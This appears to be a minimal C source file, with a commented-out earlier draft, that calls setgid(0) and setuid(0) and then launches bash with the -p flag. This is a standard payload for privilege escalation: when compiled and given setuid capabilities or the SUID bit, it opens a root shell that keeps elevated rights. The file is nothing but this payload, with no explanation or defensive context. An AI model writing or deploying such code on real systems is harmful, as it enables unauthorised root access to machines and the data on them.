// #include <errno.h>
// #include <stdio.h>
// #include <string.h>
// #include <sys/capability.h>
// #include <sys/prctl.h>
// #include <sys/types.h>
// #include <unistd.h>


// int main(void) {
//       execl("/bin/bash", "bash", "-p",  0);
// }

#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/capability.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <unistd.h>


int main(void) {
      if (setgid(0) != 0) {
        printf("Error in set gid %s\n", strerror(errno));
        return(1);
      }
      if (setuid(0) != 0) {
        printf("Error in set uid %s\n", strerror(errno));
        return(1);
      }
      execl("/bin/bash", "bash", "-p",  0);
}